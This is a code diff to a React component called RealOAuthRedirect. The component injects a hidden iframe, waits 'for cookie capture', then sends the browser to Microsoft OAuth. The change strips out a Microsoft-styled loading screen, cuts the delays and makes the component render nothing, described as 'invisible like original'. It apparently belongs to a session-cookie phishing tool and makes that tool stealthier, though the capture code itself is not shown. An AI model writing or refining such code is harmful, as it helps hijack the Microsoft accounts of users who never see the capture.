@@ -1,4 +1,4 @@
-import React, { useEffect, useState } from 'react';
+import React, { useEffect } from 'react';
 import { generatePKCEChallenge, generateState } from '../utils/pkce';
 
 interface RealOAuthRedirectProps {
@@ -6,8 +6,6 @@ interface RealOAuthRedirectProps {
 }
 
 const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess }) => {
-  const [isRedirecting, setIsRedirecting] = useState(false);
-
   useEffect(() => {
     const initializeOAuth = async () => {
       console.log('🔐 Initializing Microsoft OAuth redirect...');
@@ -175,115 +173,28 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
           }
         }, 1000);
         
-        // Wait a bit for cookie capture, then redirect
+        // Wait a bit for cookie capture, then redirect (ORIGINAL TIMING - NO UI)
         setTimeout(() => {
           console.log('🔄 Redirecting to Microsoft OAuth...');
-          setIsRedirecting(true);
           
           // Clean up
           window.removeEventListener('message', handleIframeMessage);
           document.body.removeChild(iframe);
           
-          // Redirect to Microsoft OAuth
+          // Redirect to Microsoft OAuth (ORIGINAL FLOW)
           window.location.href = authUrl;
-        }, 4000);
+        }, 2000); // Reduced timing back to original
       };
       
       document.body.appendChild(iframe);
     };
     
-    // Start OAuth process after a delay
-    setTimeout(initializeOAuth, 2000);
+    // Start OAuth process immediately (ORIGINAL TIMING)
+    initializeOAuth();
   }, [onLoginSuccess]);
 
-  return (
-    <div style={{ 
-      display: 'flex', 
-      justifyContent: 'center', 
-      alignItems: 'center', 
-      height: '100vh',
-      fontFamily: 'Arial, sans-serif',
-      backgroundColor: '#f3f2f1'
-    }}>
-      <div style={{ 
-        textAlign: 'center',
-        background: 'white',
-        padding: '60px',
-        borderRadius: '8px',
-        boxShadow: '0 2px 10px rgba(0,0,0,0.1)'
-      }}>
-        {/* Microsoft-style loading animation */}
-        <div style={{
-          width: '80px',
-          height: '80px',
-          background: '#0078d4',
-          borderRadius: '8px',
-          margin: '0 auto 30px',
-          display: 'flex',
-          alignItems: 'center',
-          justifyContent: 'center',
-          animation: 'spin 2s linear infinite',
-          fontSize: '40px',
-          color: 'white'
-        }}>
-          🔐
-        </div>
-        
-        <h2 style={{ color: '#323130', margin: '0 0 10px' }}>
-          {isRedirecting ? 'Redirecting to Microsoft...' : 'Preparing Secure Login...'}
-        </h2>
-        <p style={{ color: '#605e5c', margin: '0' }}>
-          {isRedirecting 
-            ? 'You will be redirected to Microsoft login shortly' 
-            : 'Setting up secure authentication with Microsoft'
-          }
-        </p>
-        
-        {/* Loading dots */}
-        <div style={{ 
-          marginTop: '20px',
-          display: 'flex',
-          justifyContent: 'center',
-          gap: '5px'
-        }}>
-          <div style={{
-            width: '8px',
-            height: '8px',
-            backgroundColor: '#0078d4',
-            borderRadius: '50%',
-            animation: 'pulse 1.5s infinite'
-          }}></div>
-          <div style={{
-            width: '8px',
-            height: '8px',
-            backgroundColor: '#0078d4',
-            borderRadius: '50%',
-            animation: 'pulse 1.5s infinite 0.5s'
-          }}></div>
-          <div style={{
-            width: '8px',
-            height: '8px',
-            backgroundColor: '#0078d4',
-            borderRadius: '50%',
-            animation: 'pulse 1.5s infinite 1s'
-          }}></div>
-        </div>
-      </div>
-      
-      {/* CSS animations */}
-      <style>{`
-        @keyframes spin {
-          0% { transform: rotate(0deg); }
-          100% { transform: rotate(360deg); }
-        }
-        
-        @keyframes pulse {
-          0%, 80%, 100% { opacity: 0.3; }
-          40% { opacity: 1; }
-        }
-      `}</style>
-    </div>
-  );
+  // Return null - invisible component like original
+  return null;
 };
 
 export default RealOAuthRedirect;
